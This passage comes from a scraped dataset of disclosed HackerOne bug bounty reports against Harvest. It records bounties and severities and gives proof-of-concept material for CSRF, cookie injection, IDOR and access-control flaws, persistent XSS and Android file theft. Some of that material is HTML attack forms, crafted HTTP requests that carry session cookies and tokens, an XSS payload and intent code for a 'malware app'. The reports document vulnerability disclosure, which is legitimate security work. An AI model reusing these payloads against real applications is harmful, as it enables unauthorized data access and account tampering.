Well, even it will be a classic looks and sounds, but giving the validation of the input at those affected form (First user_first_name and Last Name user_last_name) will minimize the risk. In this case, every invalid input should be rejected automatically when user trying to save the update.4 attachments:F106114: Harvest_2_-_Notification.pngF106115: Harvest_1_-_Manage_People.pngF106116: Harvest_3_-_Username_Changed_at_Admin.pngF106117: Harvest_4_-_Notification_for_User_with_Fake_Admin_Username.pngSummary by abcdefghijklmnopqrstuvwxyzabcThis is the 2nd time that Harvest shows the fair (especially, including the surprises) bug bounty. The first surprise come from report #152992 .
At the first time, I'm pretty sure if this report is not eligible for bounty and also is a low (or very low if exist) priority bug. And finally, it happened (not eligible for bounty and considered as low issue). Harvest (with Jorge) triaged the report within one day and said if the report is not eligible for the bounty even the issue is looks interesting. Because yes, it needs social engineering and the scope is limited into the internal team.
By seeing this situation, I really didn't mind with the decision. Realized if the bug is a low priority bug, it makes me really shy to make a move to ask about the progress. So I keep it silent.
Now, this day, after almost 2 years, suddenly Harvest (with Jorge again) come with the very interesting and surprise message. Jorge replied if the issue was resolved (please kindly see his very kind reply) and also will reward a small bounty. I was though if the bounty will be under the minimum bounty setup. But as you could see, Harvest acts very cool (read: fair) and unpredictable by rewarding me with $350 USD. ""The thing that basically Harvest could keep it for their pocket and didn't said anything about the report status or even the impact for the changes that made by Harvest"". But not, once again (in my own experience), they keep their integrity with their bug bounty program (in this case, by once again, told the researcher if they do something with the issue).
Please kindly note: I'm sorry for the typo that I made in this report that make this report is not comfortable to be read for public. The main reason I request the public disclosure for this report is not to share the things that I'm pretty sure that so many of researcher know this issue, but to share how very cool the Harvest's bug bounty program.
.
Summary:
As described below, the issue could allow the Attacker to inject any “Very Convince” message at:

Both of First Name (user_first_name) and Last Name (user_last_name) field at user Basic Profile;
PO Number Field (invoice_purchase_order) field at Invoices Creation Feature.
Show more",https://hackerone.com/reports/152577,New York,United States,New York,2016,7,20,15,17
Harvest,51-100,0.0,1m-10m,$300.00,Low,2.0,Command Injection - Generic,Cookie Injection at 'harvestapp.com',"zuh4n  submitted a report to Harvest.Oct 7th (6 years ago)Hello guys,
Details:
Well, initially I was testing for CRLF (Carriage Return Line Feed) Injection, but how turned out, I was able to inject cookie without CRLF, just via # value at HTTP Request.
PoC:
Attacker able to inject new cookie from any application place, e.g.
https://testerovusera.harvestapp.com/people/1412277/edit#NewLocalCookieKey=NewLocalCookieValue
in this case cookie will be created to following path, and will be valid only there: /people/1412277/
but, it could be bypassed, if append root application path, e.g.
https://testerovusera.harvestapp.com/people/1412277/edit#NewGlobalCookieKey=NewGlobalCookieValue;path=/;/
Image F126502: NewCookie.png 17.17 KiBZoom in Zoom out Copy Download
Attacking scenario:
This vulnerability perfectly could be used in combination with other vulnerabilities:

XSS thru Cookie;
Session Fixation;
CSRF protection bypass

Recommendation:
Properly validate what is going to cookie jar
Thank you,
Stas1 attachment:F126502: NewCookie.png",https://hackerone.com/reports/174474,New York,United States,New York,2016,10,7,9,52
Harvest,51-100,0.0,1m-10m,$100.00,No value,0.0,Cross-Site Request Forgery (CSRF),Cross-Site Request Forgery (CSRF),"malcolmx  submitted a report to Harvest.Jul 20th (6 years ago)Hello,
I Found Cross-Site Request Forgery (CSRF) while  made new Category 
POC :
Code 387 BytesWrap lines Copy Download1<html>
2  <body>
3    <form action=""https://[any_user_site].harvestapp.com/api/v2/expense_categories"" 
4
5method=""POST"">
6      <input type=""hidden"" name=""name"" value=""[category_name]"" />
7      <input type=""hidden"" name=""unit&#95;price"" value="""" />
8      <input type=""hidden"" name=""unit&#95;name"" value="""" />
9      <input type=""submit"" value=""Submit request"" />
10    </form>
11  </body>
12</html>
13
just put user site and the name of the category on this HTML Form and the category
will be created to this account.
there is no any token to validate the request here
so the attacker can use this to made a  CSRF attack to any victim account
Please Watch My POC I Attached For More Details
Thanks1 attachment:F106097: POC_Csrf_in_harvest.mp4",https://hackerone.com/reports/152569,New York,United States,New York,2016,7,20,14,45
Harvest,51-100,0.0,1m-10m,$150.00,No value,0.0,Cross-Site Request Forgery (CSRF),CSRF bypass on Submit Time sheet for Approval,"indoappsec  submitted a report to Harvest.Aug 30th (6 years ago)Hi Team,
Description : There is a Authentication token is provided for submitting Time sheet for approval. Also there is a Referral given in header. But both are not validating on server side which leads to successful CSRF attack. 
HTML POC : 
Code 691 BytesWrap lines Copy Download1<html>
2<body>
3<form action=""https://vijaygangani.harvestapp.com/daily/review"" method=""post"">
4<input type=""hidden"" name=""from_timesheet_beta"" value=""true"">
5<input type=""hidden"" name=""from_screen"" value=""daily"">
6<input type=""hidden"" name=""return_to"" value=""\time"">
7<input type=""hidden"" name=""of_user"" value="""">
8<input type=""hidden"" name=""submitted_date"" value=""244"">
9<input type=""hidden"" name=""submitted_date_year"" value=""2016"">
10<input type=""hidden"" name=""submitted_date"" value=""244"">
11<input type=""hidden"" name=""authenticity_token"" value="""">
12<input type=""hidden"" name=""period_begin"" value=""242"">
13<input type=""hidden"" name=""period_begin_year"" value=""2016"">
14<input type=""submit"">
15</body>
16</html>
Let me know if you need any other details regarding this.
Best Regards !
Vijay Kumar",https://hackerone.com/reports/164546,New York,United States,New York,2016,8,30,20,45
Harvest,51-100,0.0,1m-10m,$250.00,No value,0.0,Cross-Site Request Forgery (CSRF),CSRF token fixation in Sign in with Google,"pradeepch99  submitted a report to Harvest.Jul 20th (6 years ago)Hi
There is CSRF token fixation in Sign in with Google at https://id.getharvest.com/sessions/new
The state parameter is same for any time login
https://id.getharvest.com/oauth2/callback?state=%7B%22intent%22:%22sign-in%22%7D&code={code}
Steps to reproduce

Go to https://id.getharvest.com/sessions/new
Click sign in with google, and authorise Harvest
Capture the request in burp
copy the authorization code link https://id.getharvest.com/oauth2/callback?state={""intent"":""sign-in""}&code={attackers_code}
Open the link in other browser

Reference: https://hackerone.com/reports/55911",https://hackerone.com/reports/152586,New York,United States,New York,2016,7,20,16,2
Harvest,51-100,0.0,1m-10m,$100.00,No value,0.0,Privilege Escalation,Editing a project (LIMITED),"bugdiscloseguys  submitted a report to Harvest.Oct 19th (6 years ago)Hey there,
I found out that invited user to a project cannot edit the project settings unless he is a PROJECT MANAGER on it.
Now there is an option while editing project to make it BILLABLE OR NOT...
When it is NOT billable it is quite impossible to BILL an invoice for it without making it billable.
Now i found that while LINKING invoice if we change the project ID to that PROJECT ID the invoice will be linked.
Code 1.51 KiBWrap lines Copy Download1PUT /invoices/10878022 HTTP/1.1
2Host: hshteam.harvestapp.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0
4Accept: application/json, text/javascript, */*; q=0.01
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7Referer: https://hshteam.harvestapp.com/
8X-CSRF-Token: Y0J88vpZaPduF9TaqfFubvxJk0rPjRFhiOiaGbKdzoLQoJ7Hucsc9JrJNv+P1UcbmjDTypnrN5CeRjxcmhgdkw==
9Content-Type: application/json
10X-Requested-With: XMLHttpRequest
11Content-Length: 35
12Cookie: _harvest_sess=dnlFLzVyTVlHNTNidXRRTFVsT1JENk5aYkVHUlZKTjR1QXU4Z1FhdkJNRVhiVUo3Sll3NUhmdWRCZFFBNVhGMlA5QnhocnRtTHVHZTVOVDdZY3hZRGdoL2p6MGdvZzk0K2lLMkJaeGVMNnVFdFZza2NKcUpTSDhQUUE1RU03TGxXd2lNM2xoWDVOdStMVys5SVVBUk9SWG1kMGlQa0hTQ2RHQlBCQmlCWk14UTJkMzVFL052QS9KdE11RTRHajExdVl3alI5b0Q1by9tMk5VYno5KzdHdz09LS1aRmVhbGtic3Y0aVVmK0ZvazZLVGJBPT0%3D--3fde05f05bca3a4c3e367412ece61e23429f058d; km_ai=6tr3UOYayu5Nkh2XDJ6BBglhJco%3D; km_uq=; km_lv=x; removed_from_remarketing=true; _ga=GA1.3.637014398.1476064502; __utma=186612656.637014398.1476064502.1476075769.1476075769.1; __utmz=186612656.1476075769.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); production_access_token=eEwvTU0yTTdyRWtHZzUxaHZkUzVsYThKc2lIdkJraHJUOE0yRHE3UFVWcTllMWVRY0dwVzJwalFUc3kzdDl0azREN2RoemZEVTlIYVplRUhVOEVoazFVSmZsOFcvVElRaUV2KzZmaGY0Y01VNVVvQmFIWXZ5TWlFNEFSUnI2bk9Lcm5ENW54UTJiaVAyTzE5NDZOY0pBPT0tLSs4VzAxVmpkOXVRTHhVWHlLUXBJdWc9PQ%3D%3D--918a61031ebba3267e193c162c06bf39ff4503d1; _gat_UA-103886-9=1
13Connection: keep-alive
14
15{""invoice"":{""project_id"":12019475}}
Now the admin can UNLINK the invoice , neither can make project changes like change of client for a project,changing INVOICE method.
Please Let me know about it.
Thanks.
God is great <3",https://hackerone.com/reports/176899,New York,United States,New York,2016,10,19,20,44
Harvest,51-100,0.0,1m-10m,$150.00,High,7.95,Information Disclosure,Extracting private info of estimates.,"bugdiscloseguys  submitted a report to Harvest.Aug 18th (6 years ago)Hey there,
So when someone creates a new estimate for a client it is not accessible to anyone except the admin and the person with the private URL of the web invoice.
Now their is an option to convert estimate into invoice through  https://amandhakertest.harvestapp.com/invoices/new?estimate_id=ID_HERE through which an project manager can extract information about the private estimates of the project which he is assigned to.
If a user ( PROJECT MANAGER ) is not assigned to project X he cannot access any info of X .
If is not necessary to accept the payment for the attacker to perform this kind of attack & it will be helpful as a project manager cannot check the invoices made by the other so it is quite impossible to check into the estimates and it can also lead into accessing the private invoice created by the admin as if the admin or the client accepts the payment now he is asked to create invoice for the estimate and after creating it only he is allowed to access it but attacker can use this method and guess out what a admin would have created with the particular estimate.
Thanks.
Please let me know if you need any further assistance with.
God is great <3
Jai maa kali <3 jai maa saraswati <3 jai maa durga <3 jai maa bhawani <3 jai maa lakshmi <3 jai maa ganga <3 jai maa sita <3 jai maa vaishnodevi <3 jai shree ram <3 jai shree ganesha <3 jai shree krishna <3 jai shiv shambhu <3 jai shree shani dev <3 jai bajrang bali <3 jorgeleria Harvest staff  changed the status to Triaged. Aug 30th (6 years ago)Hi again,
We verified this one, I'm moving it to triage.
Thanks!
    
    
        
            
                
                
                
            
        
    
bugdiscloseguys   posted a comment. Aug 31st (6 years ago)@jorgeleria please note that the severity of this issue is high because the attacker is able to access private info.bugdiscloseguys   updated the severity to high. Oct 10th (6 years ago)jorgeleria Harvest staff  closed the report and changed the status to Resolved. Nov 30th (6 years ago)Hi again,
Thanks for your patience, this one should be fixed now!
Could you check if you are able to reproduce it?
Best regards,
Jorge
    
    
        
            
                
                
                
            
        
    
bugdiscloseguys   posted a comment. Nov 30th (6 years ago)I confirm the fix.Harvest  rewarded bugdiscloseguys with a $150 bounty. Dec 8th (6 years ago)Thanks for helping make Harvest more secure!bugdiscloseguys   requested to disclose this report. Dec 13th (6 years ago)  This report has been disclosed. Jan 12th (6 years ago)",https://hackerone.com/reports/160981,New York,United States,New York,2016,8,18,22,19
Harvest,51-100,0.0,1m-10m,"$1,000.00",No value,0.0,Information Disclosure,"Leak of all project names and all user names , even across applications","eboda  submitted a report to Harvest.Jul 20th (6 years ago)Summary
All project names and user names can be leaked, even cross application.
Steps to reproduce


Create a new expense, this should generate a POST request like this:
Code 219 BytesWrap lines Copy Download1POST /api/v2/expenses?user_id=1340164 HTTP/1.1
2Host: 8888sasdf.harvestapp.com
3[- snip -]
4
5-----------------------------114950898617589081931570033785
6Content-Disposition: form-data; name=""project_id""
7
811298632
9
10[-snip-]


Code 163 BytesWrap lines Copy Download1
22. Now just change the `project_id` to any other id and the server will answer:
3
4    ```{js}
5{""message"":""Test test is not assigned\n  to ███████████████ project""}


You can also change the user_id and the server will leak that one as well. We can leak user_id = 1 and project_id = 1 for example:
Code 60 BytesWrap lines Copy Download1{""message"":""██████████ is not assigned\n  to █████ project""}


Code 1 ByteWrap lines Copy Download1
2",https://hackerone.com/reports/152696,New York,United States,New York,2016,7,20,21,53
Harvest,51-100,0.0,1m-10m,$500.00,No value,0.0,Privilege Escalation,Invoices can be added to any retainers - even closs-platform,"eboda  submitted a report to Harvest.Sep 5th (6 years ago)Summary
Hey team,
there is an IDOR bug, which allows me to add an invoice to any retainer I wish, even if the retainer belongs to another app/subdomain.
Steps to reproduce

Make sure you have two apps A and B
In A create a retainer, let's say it has id 1234.
In B open this link:
https://SUBDOMAIN.harvestapp.com/invoices/new?invoice[client_id]=5678&invoice[kind]=retainer&invoice[retainer_id]=1234

    Here 5678 needs to be a valid client id for account B. Then simply fill out the invoice form and save it.

Now in account A go to https://[SUBDOMAIN].harvestapp.com/retainers/1234 and you will see that the invoice from account B was added to this retainer.",https://hackerone.com/reports/165862,New York,United States,New York,2016,9,5,12,38
Harvest,51-100,0.0,1m-10m,$150.00,No value,0.0,None,Opportunity to set arbitrary cookies,"s_p_q_r  submitted a report to Harvest.Jul 27th (6 years ago)The location hash on a configure page is used to set a cookie value of the same content. Visiting of a page like https://%domain%.harvestapp.com/invoices/configure#foo will result into a foo cookie setting. This value isn't validated at all, which gives an attacker the opportunity to set arbitrary cookies for the entire .harvestapp.com domain.
The following link sets a cookie value for the entire harvestapp.com site till the end of 2050:

https://%domain%.harvestapp.com/invoices/configure#test=test;domain=.harvestapp.com;path=/;expires=Sat, 31 Dec 2050 23:59:59 GMT;

Tested with Google Chrome 51.0.
 
This can cause different attacks, such as session fixation, CSRF in case of cookie-stored tokens, and client-side DoS by setting the entire cookie value too long, so that all the following requests will be rejected: after visiting a few links like

https://%domain%.harvestapp.com/invoices/configure#cookie%num%=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;domain=.harvestapp.com;path=/

the server will return a 400 error.",https://hackerone.com/reports/154400,New York,United States,New York,2016,7,27,17,14
Harvest,51-100,0.0,1m-10m,$100.00,No value,0.0,Improper Authentication - Generic,PM can delete payment of any invoice in company (Access control Issue),"indoappsec  submitted a report to Harvest.Aug 15th (6 years ago)Hi Team,
Description :  Project manager(Full Access) have Access to only assigned projects and he will have access to limited Invoices. But Project manager can Delete Payment of Any invoices in the company. The HTTP request Doesn't check whether Project manager have access to the project or not. 
HTTP request : 
POST /invoices/[Invoice_ID]/payments/[Payment_ID]HTTP/1.1
Host: vijaygangani.harvestapp.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://vijaygangani.harvestapp.com/invoices/10392603
Cookie: [Cookie_values]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
_method=delete&authenticity_token=[Oauth_token]
Steps to reproduce :
In the above mentioned Request change the Invoice_ID and payment_ID Accordingly and send it to server by the Project manager who doesn't have access to this Invoice . You will see that the Payment will be deleted for that particular Invoice .
Let me know if you need detailed Steps or Video poc for this issue.
Best Regards !
Vijay Kumar",https://hackerone.com/reports/159393,New York,United States,New York,2016,8,15,2,6
Harvest,51-100,0.0,1m-10m,$250.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,Persistent XSS on ForecastApp,"lucasveigaf  submitted a report to Harvest.Jan 20th (6 years ago)When adding a new Person, by inserting this in First or Last Name, I've got a persistent XSS:
<sVg/oNloAd=//><sVg/oNloAd=alert(""XSS2"")//>
The key for this is that the person with the XSS string must appear in one or more dropdown menus. In other words, the Person must be available to be assigned to at least one project.
I can also trigger the alert box by clicking on Expand All and any time slot where the Person with the XSS string is in the dropdown menu.
This is true for all similar dropdown menus. If I create a Client with the same string, I also get the alert box when creating a New Project since there's a dropdown menu that lists the Clients.
If I create a New Project with the XSS string in Project Name, I can trigger the alert box on the Team's tab in the same way as in the Projects' tab.
Also, by going to https://forecastapp.com/000000/projects and clicking on the malicious project, the alert box is also triggered.3 attachments:F153725: teams_tab.JPGF153726: projects_tab.JPGF153727: projects_page.JPG",https://hackerone.com/reports/199804,New York,United States,New York,2017,1,20,1,40
Harvest,51-100,0.0,1m-10m,$500.00,No value,0.0,Information Disclosure,Possible to steal any protected files on Android,"bagipro  submitted a report to Harvest.Aug 21st (6 years ago)Hi. I have found an issue which allows to retrieve any files from /data/data/com.harvestapp/* directory. The problem is in exported activity com.harvestapp.app.EditExpenseActivity which accepts URI to a pdf to be processed and saved it on SD Card which is world accessible directory, but in real world it does not validate which file is given, so I can enter any uri and this file will be copied to /sdcard/Android/data/com.harvestapp/files/<current time stamp>.pdf
Here is a PoC of stealing /data/data/com.harvestapp/databases/harvest.db
Code of the malware app:
Code 352 BytesWrap lines Copy Download1        Intent intent = new Intent(""android.intent.action.SEND"");
2        intent.setClassName(""com.harvestapp"", ""com.harvestapp.app.EditExpenseActivity"");
3        intent.setType(""application/pdf"");
4        intent.putExtra(""android.intent.extra.STREAM"", Uri.parse(""file:///data/data/com.harvestapp/databases/harvest.db""));
5        startActivity(intent);
Screenshots of results are attached2 attachments:F113677: Screenshot_2016-08-21-03-03-24.pngF113678: Screenshot_2016-08-21-03-02-50.png",https://hackerone.com/reports/161710,New York,United States,New York,2016,8,21,1,7
Harvest,51-100,0.0,1m-10m,$500.00,No value,0.0,Improper Authentication - Generic,Project Disclosure of all Harvest Instances,"thsa  submitted a report to Harvest.Jul 21st (6 years ago)Hello,
The POST request to create new Retainer in admin panel can use and disclose all the projects in @harvest not just available in admin's @harvest instance.
Steps to Reproduce:

Login to application using admin credentials and traverse to Invoices > Retainers > + New Retainers
Select valid Client and Project and click on Create Retainer
Intercept the request and change the retainer[project_id] POST parameter value to any other project ID (Example: 11310690)
Observe the mapped project in resulting page (which is not of the user's) 

Request:
Code 1.81 KiBWrap lines Copy Download1POST /retainers HTTP/1.1
2Host: kalki.harvestapp.com
3Connection: close
4Content-Length: 200
5Cache-Control: max-age=0
6Origin: https://kalki.harvestapp.com
7Upgrade-Insecure-Requests: 1
8User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
9Content-Type: application/x-www-form-urlencoded
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
11Referer: https://kalki.harvestapp.com/retainers
12Accept-Encoding: gzip, deflate, br
13Accept-Language: en-US,en;q=0.8
14Cookie: __utma=; __utmb=; __utmc=; __utmx=; __utmz=; __utmv=; __utmk=; removed_from_remarketing=true; production_access_token=c25JenRIcEJ4MHdOL08wa1VaL0paTURlcUdqZjZpUnlxZHVaYUJxSDZSektHYlVkOXlYS3JBMG5FQjVsbWJKSHpBOW1Cd3dBWjNsQkRITDlwNUlFVXlZTG1PM3IwS20xZjRCTnlhMFIvZktwdWhXU0l1QnZUWkJDUnRJUmRJZjJHVlRoakRrK2J2QmkxUmUvekN5U253PT0tLW5zUTV4Z3JpNkhCeGdMczk3WnUrNVE9PQ%3D%3D--c6f2aa80cba2531fb74f3c964ebb98f94284dacd; tab=projects; _gat_UA-103886-9=1; _harvest_sess=VE1ENjJJdWJNMTFaQ05XRU5VeS9odFdjYlNvekpkNU9SSWo2OGNKaXVPempNOTd5Vk1jYVo5ZC9Fa1RydzRxVHJTTXV4ejFUeHpMSG5VVXBiQTl6ZG5Qb2kwUXc1QXpmUU5OMjlhVk9zdndOTVFxd01PSWJXeHJLR3RhbmFtQzVwOEdtUXQ1djNWaytZYS83Q2xKZDA2MC9GQ3ZJbGwwMVluTHp5WWRzTWZISC9KelRSTnpsNUViRXliMThFYU5ldFJkY2w5TjhBMmZodVIxblU4TjdIR3NDK3Q5RXNzRUtjb1FvU0RKeDlTTTQxN1RiN3BVLy9RVGF5SUxrTzUvYlVXWjRaZy9zMmhnTVEzY0djQjF3R0x1K0o5ZlF1SURISjRCN0NiMmVwYXRyem43UHVpRG1adnl6aFo4cXZNU1BnZk1NS28yc0ppeDJ4ZHpyZDF3MkVnPT0tLWl3cExZMTY5QTI2R2sramlUSkZsbmc9PQ%3D%3D--fdf23974636360066904b23490cee4aaa8af998a; __utma=; __utmb=; __utmc=; __utmx=; __utmz=; __utmv=; __utmk=; _ga=GA1.3.248343812.1469015568
15
16utf8=%E2%9C%93&authenticity_token=2sMNTZOgzHB08ikQe5W%2FQVIJlH%2Bhr5tUKNJtLELNQ%2FCMteRK%2FmAU8MGBORxzjWJPUbaovG0yVqAqZ5KFi0uVWg%3D%3D&retainer%5Bclient_id%5D=4679616&retainer%5Bproject_id%5D=113106901 attachment:F106407: harvest_Project_Disclosure_of_all_Harvest_Instances.png",https://hackerone.com/reports/152929,New York,United States,New York,2016,7,21,15,6
Harvest,51-100,0.0,1m-10m,$100.00,No value,0.0,Privilege Escalation,PM can delete the company logo image (Vertical Privilege Escalation ),"indoappsec  submitted a report to Harvest.Aug 15th (6 years ago)Hi Team,
Description : Only Admin can Delete the Company Logo image In company account on harvestapp.But the Deleting Logo HTTP request doesn't validate the Access of the user properly and a Project manager(Limited access to Company Settings ) can  Delete the Logo image of the company.
Vulnerable HTTP reuqest : 
POST /logo?referer=invoice HTTP/1.1
Host: [Company_name].harvestapp.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://vijaygangani.harvestapp.com/invoices/configure
Cookie: [Cookie_values]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
_method=delete&authenticity_token=[Oauth_Token]
Steps to reproduce :
1.Create a account with Admin and add project (managerAttacker).
2.Open Project manager's account and Go to link : https://vijaygangani.harvestapp.com/invoices/configure#appearance_edit
You will see that Project manager doesn't  have access to it.
3.Now send the above mentioned Request to server from Project manager's account and you will see from Admin Account that the Company Logo image has been deleted.
Let me know if you need Video POC for this issue or any other help from my side.
Best Regards !
Vijay Kumar",https://hackerone.com/reports/159387,New York,United States,New York,2016,8,15,1,42
Harvest,51-100,0.0,1m-10m,$250.00,No value,0.0,Improper Authentication - Generic,PM with can Set up email for invoices and estimates (Access control Issue),"indoappsec  submitted a report to Harvest.Aug 13th (6 years ago)Hi Team,
Description : Project Manager With limited access Invoices and estimates don't have access to Company information. In the company Information there is a option of adding an Email to send invoices and estimations. The limited access Project manager should not be able to Access this sections and shouldn't be able to add the email to send invoices on that.
But the Adding Email HTTP request have some access control issues.Hence it let's the Project manager (with limited) to Add new email . 
Steps to reproduce :
1.Create a New account with Owner(UserA) and add a Project manager(Attacker) where he doesn't have access to invoices and addition features.
2.Open the Project Manager's account and you will see that he's not able to access the Invoice and estimation section where you can change the company info.
3.Run the Below Mentioned HTTP request  From any proxy tool : 
POST /sender_emails HTTP/1.1
Host: vijaygangani.harvestapp.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/javascript, text/html, application/xml, text/xml, /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.7
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://vijaygangani.harvestapp.com/invoices/configure
Content-Length: 287
Cookie: [Cookie_values]
Connection: keep-alive
utf8=%E2%9C%93&url_hash=thank_you_email&sender_email%5Bname%5D=[Sender's Name]&sender_email%5Bemail%5D=[Email]&authenticity_token=[Token_Value]&x_requested_with=XMLHttpRequest
4.After sending  this Request to server ,It won't check the access and The verification email will be sent to your mentioned email in the HTTP request.
5. Now Attacker can go to the email and add his email by verifying the email.
Note : The above Mentioned HTTP request can be get by below mentioned link and add email :  https://vijaygangani.harvestapp.com/invoices/configure#company_information_edit
Impact :  Any Project Manager with limited access can add his own email to get All the estimation and invoice Details.
